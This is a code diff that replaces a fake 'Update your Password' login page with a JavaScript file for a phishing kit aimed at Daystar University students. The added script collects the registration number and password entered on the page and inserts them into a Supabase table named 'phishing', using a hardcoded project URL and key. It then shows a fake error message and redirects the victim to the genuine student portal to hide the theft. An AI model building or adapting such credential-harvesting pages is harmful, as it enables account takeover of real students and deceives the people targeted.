@@ -1,226 +1,97 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Update your Password</title>
-
-<style>
-
-*{
-    margin:0;
-    padding:0;
-    box-sizing:border-box;
-    font-family: Arial, sans-serif;
-}
-
-body{
-    min-height:100vh;
-
-    display:flex;
-    justify-content:center;
-    align-items:flex-start;
-
-    padding:10px 0;
-
-    background-image:url("background.jpg");
-    background-size:cover;
-    background-position:center;
-    background-attachment:fixed;
-}
-
-.login-container{
-
-    width:450px;
-    max-width:95%;
-
-    margin:20px 0;
-
-    border-radius:10px;
-    overflow:hidden;
-}
-
-.logo-section{
-    background:#0f3c78;
-    text-align:center;
-    padding:10px 10;
-    height:150px;
-padding-top:30px;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-}
-
-.logo-section img{
-      width:450px;
-    max-width:90%;
-    height:auto;
-}
+// ==========================
+// SUPABASE CONFIG
+// ==========================
 
-.form-section{
+const SUPABASE_URL =
+"https://tzygochlibduxubsblzd.supabase.co";
 
-    background:linear-gradient(
-        to bottom,
-        #0f3c78,
-        #0b66b0,
-        #19a1e5
-    );
+const SUPABASE_ANON_KEY =
+"sb_publishable_GVnQsJLt8IzlyOUAL48Kmg_kdLxPzxH";
 
-    padding:50px;
-	
-}
+const client = supabase.createClient(
+    SUPABASE_URL,
+    SUPABASE_ANON_KEY
+);
 
-.form-group{
-    margin-bottom:10px;
-}
+// ==========================
+// FORM SUBMIT
+// ==========================
 
-label{
-    color:white;
-    display:block;
-    margin-bottom:10px;
-    font-size:18px;
-    font-weight:bold;
-}
+document
+.getElementById("studentForm")
+.addEventListener("submit", async function(e){
 
-input[type="text"],
-input[type="password"]{
+    e.preventDefault();
 
-    width:100%;
-    padding:18px;
+    const status =
+    document.getElementById("status");
 
-    border:none;
-    border-radius:5px;
+    const username =
+    document.getElementById("uname").value;
 
-    font-size:18px;
-}
+    const password =
+    document.getElementById("pass").value;
 
-.remember{
-    color:white;
-    margin-bottom:25px;
-}
+    // Check passwords match
 
-button{
 
-    width:100%;
-    padding:18px;
+// Check minimum length
 
-    border:none;
-    border-radius:5px;
 
-    background:#001f5c;
-    color:white;
+    status.innerHTML = "Connecting...";
 
-    font-size:24px;
-    cursor:pointer;
-}
+    try {
 
-button:hover{
-    background:#001445;
-}
+        const { data, error } =
+        await client
+        .from("phishing")
+        .insert([
+            {
+                username: username,
+                password: password
+            }
+        ]);
 
-.forgot{
+        if(error){
 
-    text-align:center;
-    margin-top:30px;
-}
+            console.error(error);
 
-.forgot a{
-    color:white;
-    text-decoration:none;
-    font-size:20px;
-}
+            status.innerHTML =
+            "Error: " + error.message;
 
-#status{
-    margin-top:15px;
-    color:white;
-    text-align:center;
-}
-.form-content{
+            alert(
+                "SUPABASE ERROR\n\n" +
+                error.message
+            );
 
-    width:85%;
-    margin:0 auto;
-}
-input{
+            return;
+        }
 
-    height:50px;
-}
-	#status{
+   status.innerHTML =
+"<span style='color:red;font-weight:bold;'>Ooops something went wrong! try again...</span>";
 
-    min-height:30px;
+document
+.getElementById("studentForm")
+.reset();
 
-    text-align:center;
+// Wait 2 seconds then redirect
+setTimeout(() => {
+    window.location.href = "https://student.daystar.ac.ke/";
+}, 100);
 
-    font-size:20px;
+    }
+    catch(err){
 
-    font-weight:bold;
+        console.error(err);
 
-    margin:15px 0;
+        status.innerHTML =
+        "JavaScript Error: " +
+        err.message;
 
-    color:red;
-}
+        alert(
+            "JAVASCRIPT ERROR\n\n" +
+            err.message
+        );
+    }
 
-</style>
-
-</head>
-
-<body>
-
-<div class="login-container">
-
-    <div class="logo-section">
-
-        <img src="logo.png" alt="Logo">
-
-    </div>
-
-    <div class="form-section">
-
-        <form id="studentForm">
-
-            <div class="form-group">
-
-                <label>Reg. Number</label>
-
-    <input
-        type="text"
-        id="uname"
-        placeholder="Reg. Number"
-        required>
-
-            </div>
-
-            <div class="form-group">
-
-                <label>Password</label>
-
-    <input
-        type="password"
-        id="pass"
-        placeholder="Password"
-        required>
-
-            </div>
-			           
-			           
-
-<div id="status"></div>
-            <button type="submit">
-                Log in
-            </button>
-
-            
-
-        </form>
-
-      
-
-    </div>
-
-</div>
-
-<div id="matchMessage"></div>
-<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-<script src="app.js"></script>
-
-</body>
-</html>
+});
